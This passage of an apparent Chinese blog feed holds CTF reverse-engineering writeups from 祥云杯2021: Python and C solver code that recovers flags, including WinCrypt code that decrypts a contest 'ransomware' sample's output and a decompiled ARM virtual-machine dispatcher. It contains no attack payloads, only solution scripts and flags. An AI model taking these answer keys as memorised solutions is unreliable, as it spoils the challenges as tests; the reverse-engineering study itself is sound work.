&quot;</span>,v1[<span class="hljs-number">0</span>],v1[<span class="hljs-number">1</span>]);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x %x\n&quot;</span>,v2[<span class="hljs-number">0</span>],v2[<span class="hljs-number">1</span>]);<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//    encipher(r, v1, key1);</span><br><span class="hljs-comment">//    printf(&quot;%x %x\n&quot;,v1[0],v1[1]);</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>3:</p><p>发现 block+0x222 的位置应该为0xb7ad</p><p>然后反推得到：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">!<span class="hljs-symbol">@FFFE</span><span class="hljs-meta">#0F20-11B7</span><br></code></pre></td></tr></table></figure><p>组合起来就是最后的flag。</p><h1 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h1>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>祥云杯2021-re部分wp</title>
    <link href="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-re%E9%83%A8%E5%88%86wp/"/>
    <url>/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-re%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Dizzy"><a href="#Dizzy" class="headerlink" title="Dizzy"></a>Dizzy</h1><p>通过sublime 进行replace 加减操作和行逆序操作，然后exec执行跑出flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">byte_43841C = [<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;&lt;&quot;</span>),-<span class="hljs-number">29</span>,-<span class="hljs-number">4</span>,<span class="hljs-number">46</span>,<span class="hljs-number">65</span>,<span class="hljs-number">7</span>,<span class="hljs-number">94</span>,<span class="hljs-number">98</span>,-<span class="hljs-number">49</span>,-<span class="hljs-number">24</span>,-<span class="hljs-number">14</span>,-<span class="hljs-number">110</span>,<span class="hljs-number">0x80</span>,-<span class="hljs-number">30</span>,<span class="hljs-number">54</span>,-<span class="hljs-number">76</span>,-<span class="hljs-number">78</span>,<span class="hljs-number">103</span>,<span class="hljs-number">119</span>,<span class="hljs-number">15</span>,-<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,-<span class="hljs-number">74</span>,-<span class="hljs-number">19</span>,<span class="hljs-number">28</span>,<span class="hljs-number">101</span>,-<span class="hljs-number">118</span>,<span class="hljs-number">7</span>,<span class="hljs-number">83</span>,-<span class="hljs-number">90</span>,<span class="hljs-number">102</span>]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;code.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    code = f.readlines()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> code:<br>        <span class="hljs-built_in">exec</span>(i.strip())<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(byte_43841C)):<br>    flag += <span class="hljs-built_in">chr</span>(byte_43841C[i] &amp; <span class="hljs-number">0xff</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="勒索解密"><a href="#勒索解密" class="headerlink" title="勒索解密"></a>勒索解密</h1><p>首先根据BMP文件头爆破time常数，然后进行解密。</p><p><img src="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-re%E9%83%A8%E5%88%86wp/image-20210823111128774.png" alt="image-20210823111128774"></p><p>刚开始自己使用rsa和aes进行解密，发现解不出来，rsa每次都在变，没有仔细分析什么原因，后来直接使用wincryptAPI进行解密，rsa只有0x80，感觉影响不大，直接解密AES得到图片。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;wincrypt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;conio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-comment">// Link with the Advapi32.lib file.</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment (lib, <span class="hljs-meta-string">&quot;crypt32.lib&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>FILE *stream1, *stream2;<br><span class="hljs-keyword">char</span> *p;<br>stream1 = fopen(<span class="hljs-string">&quot;C:\\Users\\s1lenc3\\Desktop\\fff.txt&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br>stream2 = fopen(<span class="hljs-string">&quot;C:\\Users\\s1lenc3\\Desktop\\flag.bmp.ctf_crypter&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>fseek(stream2, <span class="hljs-number">0</span>, SEEK_END); <span class="hljs-comment">/* 定位到文件末尾 */</span><br><span class="hljs-keyword">int</span> flen = ftell(stream2) + <span class="hljs-number">1</span> - <span class="hljs-number">0x80</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, flen);<br><br>p = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(flen); <span class="hljs-comment">/* 根据文件大小动态分配内存空间 */</span><br><span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>)<br>&#123;<br>fclose(stream2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>fseek(stream2, <span class="hljs-number">0</span>, SEEK_SET); <span class="hljs-comment">/* 定位到文件开头 */</span><br>fread(p, flen, <span class="hljs-number">1</span>, stream2); <span class="hljs-comment">/* 一次性读取全部文件内容 */</span><br>HCRYPTPROV phProv[<span class="hljs-number">21</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>HCRYPTHASH phHash = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//time = 611a1105</span><br><span class="hljs-comment">//int pbData[4] = &#123; 0x0ec62fb2, 0x4b54d44f, 0x6120a543, 0x8eb1e721 &#125;;</span><br><span class="hljs-keyword">int</span> pbData[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0x0ec62fb2</span>, <span class="hljs-number">0x4b54d44f</span>, <span class="hljs-number">0x611a1105</span>, <span class="hljs-number">0x8eb1e721</span> &#125;;<br>BYTE pbData2[<span class="hljs-number">4</span>];<br>DWORD pdwDataLen = <span class="hljs-number">16</span>;<br>BYTE v11[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">char</span> in[<span class="hljs-number">64</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">char</span> out1[<span class="hljs-number">32</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">char</span> out2[<span class="hljs-number">32</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// bl</span><br>BYTE *v4; <span class="hljs-comment">// esi</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CERT_PUBLIC_KEY_INFO</span> *<span class="hljs-title">v5</span>;</span><br>DWORD pcbStructInfo;<br>DWORD pcbBinary;<br>DWORD v8 = <span class="hljs-number">16</span>;<br><span class="hljs-built_in">memcpy</span>(in, <span class="hljs-string">&quot;123456789&quot;</span>, <span class="hljs-number">9</span>);<br><span class="hljs-comment">//memcpy(out, &quot;\x82\x23\x4B\x7C\xCC\x17\x28\x3D\x2D\xC8\x79\x23\xF9\xA5\x40\x2F\x6D\x3B\x7F\x28\x7F\x08\xC8\x91\x0E\x69\xC0\xDA\x22\xCE\x2D\xF5&quot;, 32);</span><br><span class="hljs-comment">//\xB2\x02\xF8\x09\x6A\x8B\x3F\x25\x94\xED\xE7\xB1\xC9\xFC\x3A\xA7\xC6\x78\x5F\x43\x36\xB6\xD7\x43\xDD\xB8\x0C\x13\x60\xAC\x60\xD0</span><br><span class="hljs-comment">//int r_size = fread(out2, 1, 32, stream2);</span><br><span class="hljs-comment">//printf(&quot;%s\n&quot;, out2);</span><br><span class="hljs-comment">//memcpy(out1, out2, 32);</span><br><span class="hljs-built_in">memset</span>(phProv, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(phProv));<br><span class="hljs-keyword">if</span> (CryptAcquireContextA(phProv, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Microsoft Enhanced RSA and AES Cryptographic Provider&quot;</span>, <span class="hljs-number">0x18</span>u, <span class="hljs-number">0xF0000000</span>))<br>&#123;<br>phHash = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (CryptCreateHash(*phProv, <span class="hljs-number">0x800C</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;phHash))<br>&#123;<br><span class="hljs-comment">//pbData[2] = i;</span><br><span class="hljs-keyword">if</span> (CryptHashData(phHash, (<span class="hljs-keyword">const</span> BYTE *)&amp;pbData, <span class="hljs-number">0x10</span>, <span class="hljs-number">0</span>))<br>&#123;<br>CryptDeriveKey(*phProv, <span class="hljs-number">0x660E</span>, phHash, <span class="hljs-number">0</span>, (HCRYPTKEY *)(phProv + <span class="hljs-number">1</span>));<span class="hljs-comment">// CALG_AES_128</span><br><span class="hljs-comment">//printf(&quot;%d\n&quot;, i);</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">v2 = 0;</span><br><span class="hljs-comment">pcbBinary = 0;</span><br><span class="hljs-comment">if (!CryptStringToBinaryA(</span><br><span class="hljs-comment">&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCJ7DFnM7uJiQYyozOgYTJs6oT9nRadxeyYux9/q/+hRcdKolSwRio0TOmpvmNrRttsyOPx01&quot;</span><br><span class="hljs-comment">&quot;V8Cami2KonF2xqEzAg0OcDh6K1gzzBLxqI6XBipi4gJ/24OaXYFFr7CHCxBXeQDVjbPa53Kn2bOwknMT6+MuzNMoN4bFMa/p7QJQIDAQAB&quot;,</span><br><span class="hljs-comment">0xD8,</span><br><span class="hljs-comment">1,</span><br><span class="hljs-comment">0,</span><br><span class="hljs-comment">&amp;pcbBinary,</span><br><span class="hljs-comment">0,</span><br><span class="hljs-comment">0))</span><br><span class="hljs-comment">return 0;</span><br><span class="hljs-comment">v4 = (BYTE *)malloc(pcbBinary);</span><br><span class="hljs-comment">if (!CryptStringToBinaryA(</span><br><span class="hljs-comment">&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCJ7DFnM7uJiQYyozOgYTJs6oT9nRadxeyYux9/q/+hRcdKolSwRio0TOmpvmNrRttsyOPx01&quot;</span><br><span class="hljs-comment">&quot;V8Cami2KonF2xqEzAg0OcDh6K1gzzBLxqI6XBipi4gJ/24OaXYFFr7CHCxBXeQDVjbPa53Kn2bOwknMT6+MuzNMoN4bFMa/p7QJQIDAQAB&quot;,</span><br><span class="hljs-comment">0,</span><br><span class="hljs-comment">1,</span><br><span class="hljs-comment">v4,</span><br><span class="hljs-comment">&amp;pcbBinary,</span><br><span class="hljs-comment">0,</span><br><span class="hljs-comment">0))</span><br><span class="hljs-comment">return 0;</span><br><span class="hljs-comment">pcbStructInfo = 0;</span><br><span class="hljs-comment">if (!CryptDecodeObjectEx(0x10001, (LPCSTR)8, v4, pcbBinary, 0, 0, 0, &amp;pcbStructInfo))</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">return 0;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">v5 = (struct _CERT_PUBLIC_KEY_INFO *)malloc(pcbStructInfo);</span><br><span class="hljs-comment">if (CryptDecodeObjectEx(0x10001, (LPCSTR)8, v4, pcbBinary, 0, 0, v5, &amp;pcbStructInfo))</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">CryptImportPublicKeyInfo(*phProv, 0x10001, v5, &amp;phProv[2]);</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">CryptEncrypt(phProv[2], 0, 1, 0, (BYTE *)pbData, &amp;v8, 0x80);</span><br><span class="hljs-comment">*/</span><br>CryptSetKeyParam(phProv[<span class="hljs-number">1</span>], <span class="hljs-number">4</span>, pbData2, <span class="hljs-number">0</span>);<br>*(DWORD *)v11 = <span class="hljs-number">1</span>;<br>CryptSetKeyParam(phProv[<span class="hljs-number">1</span>], <span class="hljs-number">3u</span>, v11, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (j &lt;= flen - <span class="hljs-number">1</span>) &#123;<br><span class="hljs-keyword">if</span> (j + <span class="hljs-number">32</span> == flen - <span class="hljs-number">1</span>) &#123;<br><span class="hljs-built_in">memcpy</span>(out1, p + j, <span class="hljs-number">32</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">memcpy</span>(out1, p + j, <span class="hljs-number">16</span>);<br>&#125;<br><span class="hljs-comment">//CryptEncrypt(phProv[1], 0, 1, 0, out, &amp;pdwDataLen, 32);</span><br><span class="hljs-keyword">if</span> (j + <span class="hljs-number">32</span> == flen - <span class="hljs-number">1</span>) &#123;<br>CryptDecrypt(phProv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, out1, &amp;pdwDataLen);<br>fwrite(out1, <span class="hljs-number">1</span>, <span class="hljs-number">32</span>, stream1);<br>j += <span class="hljs-number">32</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>CryptDecrypt(phProv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, out1, &amp;pdwDataLen);<br>fwrite(out1, <span class="hljs-number">1</span>, <span class="hljs-number">16</span>, stream1);<br>j += <span class="hljs-number">16</span>;<br>&#125;<br><span class="hljs-comment">//fwrite(out1, 1, 32, stream1);</span><br><span class="hljs-comment">//if (memcmp(out, &quot;\x42\x4d\xbe\x67&quot;, 4) == 0) &#123;</span><br><span class="hljs-comment">//printf(&quot;12321&quot;);</span><br><span class="hljs-comment">//printf(&quot;%x\n&quot;, i);</span><br><span class="hljs-comment">//&#125;</span><br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-re%E9%83%A8%E5%88%86wp/image-20210823100552950.png" alt="image-20210823100552950"></p><h1 id="LightningSystem"><a href="#LightningSystem" class="headerlink" title="LightningSystem"></a>LightningSystem</h1><p>给了一个网站，题目里有一个sal文件，使用网站中下载的工具Logic即可打开。</p><p>也不是很懂，做过类似的杂项题，我就是瞎设置，看能不能提取出字符串。</p><p><img src="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-re%E9%83%A8%E5%88%86wp/image-20210826141517611.png" alt="image-20210826141517611"></p><p>最后恢复出了通讯数据：</p><p><img src="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-re%E9%83%A8%E5%88%86wp/image-20210826142310250.png" alt="image-20210826142310250"></p><p>直接以arm架构反编译hex文件，分析代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( MEMORY[<span class="hljs-number">0x20000004</span>] == <span class="hljs-number">0xEF4015</span> )<br>  &#123;<br>    sub_8000AF0(v0, <span class="hljs-number">0</span>, <span class="hljs-number">512</span>);<br>    v2.opcode = (<span class="hljs-keyword">int</span>)&amp;v1;                       <span class="hljs-comment">// op</span><br>    v2.data = (<span class="hljs-keyword">int</span>)&amp;v0[v0[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span>];              <span class="hljs-comment">// data</span><br>    v2.pc = <span class="hljs-number">0</span>;                                  <span class="hljs-comment">// pc</span><br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">switch</span> ( *(_BYTE *)(v2.opcode + v2.pc) )<br>      &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>          sub_8000168((<span class="hljs-keyword">int</span>)&amp;v2);                <span class="hljs-comment">// pc++</span><br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:                                 <span class="hljs-comment">// output</span><br>          sub_8000170((<span class="hljs-keyword">int</span>)&amp;v2, *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:                                 <span class="hljs-comment">// input</span><br>          sub_8000196((<span class="hljs-keyword">int</span>)&amp;v2, *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:                                 <span class="hljs-comment">// mov</span><br>          sub_80001C0((<span class="hljs-keyword">int</span>)&amp;v2, *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>), *(_BYTE *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:                                 <span class="hljs-comment">// cmp</span><br>          sub_80001CC(<br>            (<span class="hljs-keyword">int</span>)&amp;v2,<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>),<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>),<br>            *(<span class="hljs-keyword">char</span> *)(v2.opcode + v2.pc + <span class="hljs-number">3</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:                                 <span class="hljs-comment">// add</span><br>          sub_80001EC((<span class="hljs-keyword">int</span>)&amp;v2, *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>), *(_BYTE *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:                                 <span class="hljs-comment">// ror</span><br>          sub_8000200((<span class="hljs-keyword">int</span>)&amp;v2, *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>), *(<span class="hljs-keyword">char</span> *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:                                 <span class="hljs-comment">// setValue</span><br>          sub_800024E(<br>            (<span class="hljs-keyword">int</span>)&amp;v2,<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>),<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:                                 <span class="hljs-comment">// add</span><br>          sub_800026A(<br>            (<span class="hljs-keyword">int</span>)&amp;v2,<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>),<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:                                 <span class="hljs-comment">// mov</span><br>          sub_800029A(<br>            (<span class="hljs-keyword">int</span>)&amp;v2,<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>),<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xA</span>:                               <span class="hljs-comment">// mul</span><br>          sub_80002AC((<span class="hljs-keyword">int</span>)&amp;v2, *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>), *(_BYTE *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xB</span>:                               <span class="hljs-comment">// sub</span><br>          sub_80002C0(<br>            (<span class="hljs-keyword">int</span>)&amp;v2,<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>),<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xC</span>:                               <span class="hljs-comment">// shl</span><br>          sub_80002F2((<span class="hljs-keyword">int</span>)&amp;v2, *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>), *(<span class="hljs-keyword">char</span> *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xD</span>:                               <span class="hljs-comment">// xor</span><br>          sub_8000328(<br>            (<span class="hljs-keyword">int</span>)&amp;v2,<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>),<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xE</span>:                               <span class="hljs-comment">// mul</span><br>          sub_8000350(<br>            (<span class="hljs-keyword">int</span>)&amp;v2,<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>),<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xF</span>:                               <span class="hljs-comment">// mov</span><br>          sub_800037C(<br>            (<span class="hljs-keyword">int</span>)&amp;v2,<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>),<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x10</span>:                              <span class="hljs-comment">// setValue</span><br>          sub_800039E(<br>            (<span class="hljs-keyword">int</span>)&amp;v2,<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">1</span>),<br>            *(<span class="hljs-keyword">unsigned</span> __int8 *)(v2.opcode + v2.pc + <span class="hljs-number">2</span>));<br>          <span class="hljs-keyword">break</span>;<br>        <span 